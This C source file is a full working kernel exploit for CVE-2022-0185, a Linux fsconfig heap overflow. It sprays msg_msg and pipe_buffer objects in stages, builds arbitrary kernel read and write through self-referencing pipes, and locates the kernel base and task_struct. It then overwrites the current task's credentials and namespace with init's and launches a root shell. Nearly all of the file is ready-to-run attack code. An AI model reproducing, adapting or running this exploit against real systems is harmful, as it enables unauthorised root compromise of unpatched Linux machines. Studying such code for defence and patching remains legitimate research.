#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/mount.h>
#include <sys/prctl.h>
#include "kernelpwn.h"

#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif

static inline int fsopen(const char *fs_name, unsigned int flags)
{
    return syscall(__NR_fsopen, fs_name, flags);
}

static inline int fsconfig(int fsfd, unsigned int cmd, 
             const char *key, const void *val, int aux)
{
    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);
}

/**
 * @brief make an out-of-bound write to the next object in kmalloc-4k,
 * note that the buf before will always be appended to a ",=",
 * for a ctx-legacy_data with 4095 bytes' data, the ',' will be the last byte,
 * and the '=' will always be on the first byte of the object nearby
 * 
 * @return int - the fd for filesystem context
 */
int prepare_oob_write(void)
{
    int fs_fd;

    /* get a filesystem context */
    fs_fd = fsopen("ext4", 0);
    if (fs_fd < 0) {
        err_exit("FAILED to fsopen()!");
    }

    /**
     * fulfill the ctx->legacy_data to 4095 bytes, 
     * so that the (0x1000 - 2 - size) overflow
     */
    for (int i = 0; i < 255; i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "arttnba", "arttnba", 0);
    }
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "arttnba3", "pwnnn", 0);

    return fs_fd;    
}

#define MSG_SPRAY_NR 0x100
#define MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define MSG_TYPE 0x41414141

#define SEQ_SPRAY_NR 0x100
#define PIPE_SPRAY_NR MSG_SPRAY_NR

int msqid[MSG_SPRAY_NR];
int seq_fd[SEQ_SPRAY_NR];
int pipe_fd[PIPE_SPRAY_NR][2];
int fs_fd, victim_qidx = -1;

/**
 * @brief We don't need to leak anything here, we just need to occupy a 4k obj.
 */
void occupy_4k_obj_by_msg(void)
{
    size_t buf[0x1000], ktext_leak = -1;

    puts("\n\033[34m\033[1m"
         "Stage I - corrupting msg_msg to leak kernel info and occupy a 4k obj"
         "\033[0m\n");

    puts("[*] Allocating pipe...");
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            printf("[x] Failed at creating %d pipe.\n", i);
            err_exit("FAILED to create pipe!");
        }
    }

    puts("[*] Allocating msg_queue and msg_msg...");
    for (int i = 0; i < (MSG_SPRAY_NR - 8); i++) {
        if ((msqid[i] = get_msg_queue()) < 0) {
            printf("[x] Failed at allocating %d queue.\n", i);
            err_exit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            err_exit("FAILED to allocate msg_msg!");
        }
    }

    puts("[*] Allocating fs->legacy_data...");
    fs_fd = prepare_oob_write();

    puts("[*] Allocating msg_queue and msg_msg...");
    for (int i = (MSG_SPRAY_NR - 8); i < MSG_SPRAY_NR; i++) {
        if ((msqid[i] = get_msg_queue()) < 0) {
            printf("[x] Failed at allocating %d queue.\n", i);
            err_exit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            err_exit("FAILED to allocate msg_msg!");
        }
    }

    /*
    puts("\n[*] Spray seq_operations...");
    for (int i = 0; i < SEQ_SPRAY_NR; i++) {
        if ((seq_fd[i] = open("/proc/self/stat", O_RDONLY)) < 0) {
            printf("[x] Failed at creating %d seq_file.\n", i);
            err_exit("FAILED to create seq_file!");
        }
    }*/

    puts("[*] fsconfig() to set the size to the &msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "3", "1919810ARTTNBA114514", 0);

    puts("[*] fsconfig() to overwrite the msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", "\xc8\x1f", 0);

    puts("[*] Tring to make an oob read...");
    for (int i = 0; i < MSG_SPRAY_NR; i++) {
        ssize_t read_size;

        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, 0);
        if (read_size < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            err_exit("FAILED to read msg_msg!");
        } else if (read_size > MSG_SZ) {
            printf("\033[32m\033[1m[+] Found victim msg_msg at \033[0m"
                   "%d\033[32m\033[1m msg_queue!\033[0m\n", i);
            victim_qidx = i;
            break;
        }
    }

    if (victim_qidx == -1) {
        err_exit("FAILED to overwrite the header of msg_msg!");
    }

    /*
    for (int i = MSG_SZ / 8; i < (OOB_READ_SZ / 8); i++) {
        if (buf[i] > 0xffffffff81000000 && ((buf[i] & 0xfff) == 0x4d0)) {
            printf("[*] Leak kernel text addr: %lx\n", buf[i]);
            ktext_leak = buf[i];
            break;
        }
    }

    if (ktext_leak == -1) {
        err_exit("FAILED to leak kernel text address!");
    }

    kernel_offset = ktext_leak - 0xffffffff813834d0;
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] kernel base: \033[0m%lx  ", kernel_base);
    printf("\033[32m\033[1moffset: \033[0m%lx\n", kernel_offset);
    */
}

/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96
#define TRD_PIPE_BUF_SZ 192

int orig_pid, victim_pid = -1;
int snd_orig_pid = -1, snd_vicitm_pid = -1;
int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;

struct pipe_buffer info_pipe_buf;

void corrupting_first_level_pipe_for_page_uaf(void)
{
    size_t buf[0x8000];

    puts("\n\033[34m\033[1m"
        "Stage II - corrupting pipe_buffer to make two pipes point to same page"
         "\033[0m\n");

    puts("[*] Allocating 4k pipe_buffer...");
    for (int i = (PIPE_SPRAY_NR - 1); i >= 0; i--) {
        if (i == victim_qidx) {
            continue;
        }

        if (read_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            err_exit("FAILED to release msg_msg!");
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] Failed at extending %d pipe_buffer.\n", i);
            err_exit("FAILED to extend pipe_buffer!");
        }

        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], "arttnba3", 8);  /* prevent pipe_release() */
    }

    puts("[*] Overwriting pipe_buffer->page...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "ar", "tt", 0);
    for (int i = 0; i < ((0x1000 - 8 * 4) / 16); i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "arttnba", "ratbant", 0);
    }

    puts("[*] Checking for pipe's corruption...");
    for (int i = (PIPE_SPRAY_NR - 1); i >= 0; i--) {
        char a3_str[0x10];
        int nr;

        if (i == victim_qidx) {
            continue;
        }

        memset(a3_str, '\0', sizeof(a3_str));
        read(pipe_fd[i][0], a3_str, 8);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!strcmp(a3_str, "arttnba3") && nr != i) {
            orig_pid = i;
            victim_pid = nr;
            break;
        }
    }

    if (victim_pid == -1) {
        err_exit("FAILED to corrupt pipe_buffer!");
    }

    printf("\033[32m\033[1m[+] Successfully corrupt pipe_buffer! "
           "orig_pid: \033[0m%d, \033[32m\033[1mvictim pipe: \033[0m%d\n",
           orig_pid, victim_pid);
}

void corrupting_second_level_pipe_for_pipe_uaf(void)
{
    size_t buf[0x1000], pipe_buf[0x100];
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/sizeof(struct pipe_buffer));

    puts("\n\033[34m\033[1m"
         "Stage III - corrupting second-level pipe_buffer to exploit a "
         "page-level UAF"
         "\033[0m\n");

    memset(buf, '\0', sizeof(buf));

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ*2 - 24 - 3*sizeof(int));

    /* free orignal pipe's page */
    puts("[*] free original pipe...");
    close(pipe_fd[orig_pid][0]);
    close(pipe_fd[orig_pid][1]);

    /* try to rehit victim page by reallocating pipe_buffer */
    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            err_exit("FAILED to re-alloc pipe_buffer!");
        }
    }

    /* read victim page to check whether we've successfully hit it */
    memset(pipe_buf, '\0', sizeof(pipe_buf));
    read(pipe_fd[victim_pid][0], buf, SND_PIPE_BUF_SZ - 8 - sizeof(int));
    read(pipe_fd[victim_pid][0], pipe_buf, 40);

    for (int i = 0; i < (40 / 8); i++) {
        printf("[----data dump----][%d] %lx\n", i, pipe_buf[i]);
    }

    /* I don't know why but sometimes the read will be strange :( */
    if (pipe_buf[4] == 0xffffffff) {
        memcpy(&info_pipe_buf, &((char*)pipe_buf)[12], 40);
    } else {
        memcpy(&info_pipe_buf, pipe_buf, 40);
    }

    printf("\033[34m\033[1m[?] info_pipe_buf->page: \033[0m%p\n" 
           "\033[34m\033[1m[?] info_pipe_buf->offset: \033[0m%x\n"
           "\033[34m\033[1m[?] info_pipe_buf->len: \033[0m%x\n"
           "\033[34m\033[1m[?] info_pipe_buf->ops: \033[0m%p\n"
           "\033[34m\033[1m[?] info_pipe_buf->flags: \033[0m%x\n"
           "\033[34m\033[1m[?] info_pipe_buf->private: \033[0m%lx\n", 
           info_pipe_buf.page, 
           info_pipe_buf.offset, 
           info_pipe_buf.len, 
           info_pipe_buf.ops, 
           info_pipe_buf.flags,
           info_pipe_buf.private);

    if ((size_t) info_pipe_buf.page < 0xffff000000000000
        || (size_t) info_pipe_buf.ops < 0xffffffff81000000) {
        err_exit("FAILED to re-hit victim page!");
    }

    puts("\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m");
    printf("\033[32m\033[1m[+] Got page leak:\033[0m %p\n", info_pipe_buf.page);
    puts("");

    /* construct a second-level page uaf */
    puts("[*] construct a second-level uaf pipe page...");
    //info_pipe_buf.offset = 8;
    //info_pipe_buf.len = 0xf00;
    for (int i = 0; i < 35; i++) {
        write(pipe_fd[victim_pid][1], &info_pipe_buf, sizeof(info_pipe_buf));
        write(pipe_fd[victim_pid][1],buf,SND_PIPE_BUF_SZ-sizeof(info_pipe_buf));
    }

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        char tmp_bf[0x10];
        int nr;

        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid) {
            continue;
        }

        read(pipe_fd[i][0], &nr, sizeof(nr));
        if (nr == 0x74747261) {
            read(pipe_fd[i][0], tmp_bf, 4);
            read(pipe_fd[i][0], &nr, sizeof(nr));
        }
        printf("[*] nr for %d pipe is %d\n", i, nr);
        if (nr < PIPE_SPRAY_NR && i != nr) {
            snd_orig_pid = nr;
            snd_vicitm_pid = i;
            printf("\033[32m\033[1m[+] Found second-level victim: \033[0m%d "
                   "\033[32m\033[1m, orig: \033[0m%d\n", 
                   snd_vicitm_pid, snd_orig_pid);
            break;
        }
    }

    if (snd_vicitm_pid == -1) {
        err_exit("FAILED to corrupt second-level pipe_buffer!");
    }
}

/**
 * VI - SECONDARY exploit stage: build pipe for arbitrary read & write
*/

void building_self_writing_pipe(void)
{
    size_t buf[0x1000];
    size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
    struct pipe_buffer evil_pipe_buf;
    struct page *page_ptr;

    puts("\n\033[34m\033[1m"
         "Stage IV - Building a self-writing pipe system"
         "\033[0m\n");

    memset(buf, 0, sizeof(buf));

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - 24 -3*sizeof(int));

    /* free orignal pipe's page */
    puts("[*] free second-level original pipe...");
    close(pipe_fd[snd_orig_pid][0]);
    close(pipe_fd[snd_orig_pid][1]);

    /* try to rehit victim page by reallocating pipe_buffer */
    puts("[*] fcntl() to set the pipe_buffer on second-level victim page...");
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            err_exit("FAILED to re-alloc pipe_buffer!");
        }
    }

    /* let a pipe->bufs pointing to itself */
    puts("[*] hijacking the 2nd pipe_buffer on page to itself...");
    evil_pipe_buf.page = info_pipe_buf.page;
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.ops = info_pipe_buf.ops;
    evil_pipe_buf.flags = info_pipe_buf.flags;
    evil_pipe_buf.private = info_pipe_buf.private;

    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_2nd_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n", 
                    self_2nd_pipe_pid);
            break;
        }
    }

    if (self_2nd_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    /* overwrite the 3rd pipe_buffer to this page too */
    puts("[*] hijacking the 3rd pipe_buffer on page to itself...");
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;

    write(pipe_fd[snd_vicitm_pid][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid
            || i == self_2nd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_3rd_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found another self-writing pipe:\033[0m"
                    "%d\n", self_3rd_pipe_pid);
            break;
        }
    }

    if (self_3rd_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    /* overwrite the 4th pipe_buffer to this page too */
    puts("[*] hijacking the 4th pipe_buffer on page to itself...");
    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;
    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;

    write(pipe_fd[snd_vicitm_pid][1],buf,TRD_PIPE_BUF_SZ-sizeof(evil_pipe_buf));
    write(pipe_fd[snd_vicitm_pid][1], &evil_pipe_buf, sizeof(evil_pipe_buf));

    /* check for third-level victim pipe */
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (i == victim_qidx) {
            continue;
        }

        if (i == orig_pid || i == victim_pid 
            || i == snd_orig_pid || i == snd_vicitm_pid
            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) {
            continue;
        }

        read(pipe_fd[i][0], &page_ptr, sizeof(page_ptr));
        if (page_ptr == evil_pipe_buf.page) {
            self_4th_pipe_pid = i;
            printf("\033[32m\033[1m[+] Found another self-writing pipe:\033[0m"
                    "%d\n", self_4th_pipe_pid);
            break;
        }
    }

    if (self_4th_pipe_pid == -1) {
        err_exit("FAILED to build a self-writing pipe!");
    }

    puts("");
}

struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;
char temp_zero_buf[0x1000]= { '\0' };

/**
 * @brief Setting up 3 pipes for arbitrary read & write.
 * We need to build a circle there for continuously memory seeking:
 * - 2nd pipe to search
 * - 3rd pipe to change 4th pipe
 * - 4th pipe to change 2nd and 3rd pipe
 */
void setup_evil_pipe(void)
{
    /* init the initial val for 2nd,3rd and 4th pipe, for recovering only */
    memcpy(&evil_2nd_buf, &info_pipe_buf, sizeof(evil_2nd_buf));
    memcpy(&evil_3rd_buf, &info_pipe_buf, sizeof(evil_3rd_buf));
    memcpy(&evil_4th_buf, &info_pipe_buf, sizeof(evil_4th_buf));

    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0xff0;

    /* hijack the 3rd pipe pointing to 4th */
    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * 3;
    evil_3rd_buf.len = 0;
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;
    evil_4th_buf.len = 0;
}

void arbitrary_read_by_pipe(struct page *page_to_read, void *dst)
{
    /* page to read */
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0xfff;
    evil_2nd_buf.page = page_to_read;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          TRD_PIPE_BUF_SZ-sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* read out data */
    read(pipe_fd[self_2nd_pipe_pid][0], dst, 0xff0);
}

void arbitrary_write_by_pipe(struct page *page_to_write, void *src, size_t len)
{
    /* page to write */
    evil_2nd_buf.page = page_to_write;
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* write data into dst page */
    write(pipe_fd[self_2nd_pipe_pid][1], src, len);
}

/**
 * VII - FINAL exploit stage with arbitrary read & write
*/

size_t *tsk_buf, current_task_page, current_task, parent_task, buf[0x8000];


void info_leaking_by_arbitrary_pipe()
{
    size_t *comm_addr;
    int try_times;

    puts("\n\033[34m\033[1m"
         "Stage V - Leaking info by arbitrary read & write"
         "\033[0m\n");

    memset(buf, 0, sizeof(buf));

    puts("[*] Setting up kernel arbitrary read & write...");
    setup_evil_pipe();

    /**
     * KASLR's granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
     * For MEM > 1GB, we can just find the secondary_startup_64 func ptr,
     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
     */
    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
    try_times = 0;
    for (;;) {
        printf("[*] Checking whether the %lx is vmemmap_base..\n",vmemmap_base);
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);
        printf("[?] Get possible data: %lx\n", buf[0]);
        if (buf[0] == 0x2400000000) {
            err_exit("READING FAILED FOR UNKNOWN REASON!");
        }
        if (buf[0] > 0xffffffff81000000 && ((buf[0] & 0xfff) == 0x030)) {
            kernel_base = buf[0] -  0x030;
            kernel_offset = kernel_base - 0xffffffff81000000;
            printf("\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n"
                   "\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n", 
                   kernel_base, kernel_offset);
            break;
        }

        try_times++;
        if (try_times == 5) {
            vmemmap_base -= 0x10000000;
            try_times = 0;
        }
    }
    printf("\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n", vmemmap_base);

    /* now seeking for the task_struct in kernel memory */
    puts("[*] Seeking task_struct in memory...");

    /**
     * For a machine with MEM less than 256M, we can simply get the:
     *      page_offset_base = heap_leak & 0xfffffffff0000000;
     * But that's not always accurate, espacially on a machine with MEM > 256M.
     * So we need to find another way to calculate the page_offset_base.
     * 
     * Luckily the task_struct::ptraced points to itself, so we can get the
     * page_offset_base by vmmemap and current task_struct as we know the page.
     * 
     * Note that the offset of different filed should be referred to your env.
     */
    for (int i = 1; 1; i++) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + (i-1)*0x40), buf);
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + i * 0x40), 
                               &((char*)buf)[0x1000]);
    
        comm_addr = memmem(buf, 0x1ff0, "arttPWNnba3", 11);
        if (comm_addr == NULL) {
            continue;
        }

        if ((((size_t) comm_addr - (size_t) buf) & 0xfff) < 500) {
            continue;
        }

        printf("[*] Found string at page: %lx\n", vmemmap_base + i * 0x40);
        printf("[*] String offset: %lx\n", 
                                   ((size_t) comm_addr - (size_t) buf) & 0xfff);
        printf("[*] comm_addr[-2]: %lx\n", comm_addr[-2]);
        printf("[*] comm_addr[-3]: %lx\n", comm_addr[-3]);
        printf("[*] comm_addr[-52]: %lx\n", comm_addr[-52]);
        printf("[*] comm_addr[-53]: %lx\n", comm_addr[-53]);
        if ((comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task->real_cred */
            && (comm_addr[-53] > 0xffff888000000000) /* task->read_parent */
            && (comm_addr[-52] > 0xffff888000000000)) {  /* task->parent */

            /* task->read_parent */
            parent_task = comm_addr[-53];

            /* task_struct::ptraced */
            current_task = comm_addr[-46] - 2280;

            page_offset_base = (comm_addr[-46]&0xfffffffffffff000) - i * 0x1000;
            page_offset_base &= 0xfffffffff0000000;

            printf("\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n",
                   (struct page*) (vmemmap_base + i * 0x40));
            printf("\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n",
                   page_offset_base);
            printf("\033[34m\033[1m[*] current task_struct's addr: \033[0m"
                   "0x%lx\n\n", current_task);
            break;
        }
    }
}

/**
 * @brief find the init_task and copy something to current task_struct
*/
void privilege_escalation_by_task_overwrite(void)
{
    puts("\n\033[34m\033[1m"
         "Stage VI - Hijack current task_struct to get the root"
         "\033[0m\n");

    /* finding the init_task, the final parent of every task */
    puts("[*] Seeking for init_task...");

    for (;;) {
        size_t ptask_page_addr = direct_map_addr_to_page_addr(parent_task);

        tsk_buf = (size_t*) ((size_t) buf + (parent_task & 0xfff));

        arbitrary_read_by_pipe((struct page*) ptask_page_addr, buf);
        arbitrary_read_by_pipe((struct page*) (ptask_page_addr+0x40),&buf[512]);

        /* task_struct::real_parent */
        if (parent_task == tsk_buf[278]) {
            break;
        }

        parent_task = tsk_buf[278];
    }

    init_task = parent_task;
    init_cred = tsk_buf[329];
    init_nsproxy = tsk_buf[341];

    printf("\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n", init_task);
    printf("\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n", init_cred);
    printf("\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n",init_nsproxy);

    /* now, changing the current task_struct to get the full root :) */
    puts("[*] Escalating ROOT privilege now...");

    current_task_page = direct_map_addr_to_page_addr(current_task);

    arbitrary_read_by_pipe((struct page*) current_task_page, buf);
    arbitrary_read_by_pipe((struct page*) (current_task_page+0x40), &buf[512]);

    tsk_buf = (size_t*) ((size_t) buf + (current_task & 0xfff));
    tsk_buf[328] = init_cred;
    tsk_buf[329] = init_cred;
    tsk_buf[341] = init_nsproxy;

    arbitrary_write_by_pipe((struct page*) current_task_page, buf, 0xff0);
    arbitrary_write_by_pipe((struct page*) (current_task_page+0x40),
                            &buf[512], 0xff0);

    puts("[+] Done.\n");
}

int msg_pipe[2];

void signal_handler(int nr)
{
    printf("[x] Receive signal %d!\n", nr);
    sleep(114514);
}

int main(int argc, char **argv, char **envp)
{
    puts("[*] CVE-2022-0185 - exploit by arttnba3");

    signal(SIGSEGV, signal_handler);

    pipe(msg_pipe);

    if (!fork()) {
        /* create new namespace to get CAP_SYS_ADMIN */
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
            err_exit("FAILED to unshare()!");
        }

        bind_core(0);

        occupy_4k_obj_by_msg();sleep(1);
        corrupting_first_level_pipe_for_page_uaf();sleep(1);
        corrupting_second_level_pipe_for_pipe_uaf();sleep(1);
        building_self_writing_pipe();sleep(1);
        info_leaking_by_arbitrary_pipe();sleep(1);
        privilege_escalation_by_task_overwrite();sleep(1);

        write(msg_pipe[1], "arttnba3", 8);

        sleep(114514);
    } else {
        char ch;

        if (prctl(PR_SET_NAME, "arttPWNnba3") < 0) {
            err_exit("FAILED to prctl()!");
        }

        read(msg_pipe[0], &ch, 1);
    }

    puts("[*] checking for root...");
    get_root_shell();

    return 0;
}